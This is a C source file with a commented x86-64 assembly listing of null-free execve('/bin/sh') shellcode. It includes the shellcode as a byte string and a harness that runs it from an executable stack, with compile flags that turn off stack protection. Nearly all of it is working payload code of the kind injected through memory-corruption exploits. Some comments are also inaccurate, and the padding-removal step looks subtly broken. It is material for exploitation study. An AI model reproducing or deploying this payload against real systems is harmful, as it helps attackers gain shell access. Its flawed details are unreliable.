/*
William Borskey 2015
Compile with: gcc -fno-stack-protector -z execstack Shellcode written in 64 bit Intel assembly using yasm.

  1 ; int execve(const char *filename, char *const argv[], char *const envp[]);
  2 BITS 64
  3
  4 section .text
  5         global start
  6
  7 start:
  8         mov rcx, 0x1168732f6e69622f ;move the immediate value /bin/sh in hex in
  9                                     ;little endian byte order into rcx padded with 11
 10         shl rcx, 0x08               ;left shift to trim off the two bytes of padding
 11         shr rcx, 0x08               ;ringht shift to re order string
 12         push rcx                    ;push the immediate value stored in rcx onto the stack
 13         lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi
 14         xor rdx, rdx                ;zero out rdx for an execve argument
 15         mov al, 0x3b                ;move 0x3b (execve sycall) into al to avoid nulls
 16         syscall                     ;make the syscall
*/

char shellcode[] = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05";

int main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) shellcode;
    (int)(*func)();
     return 0;
}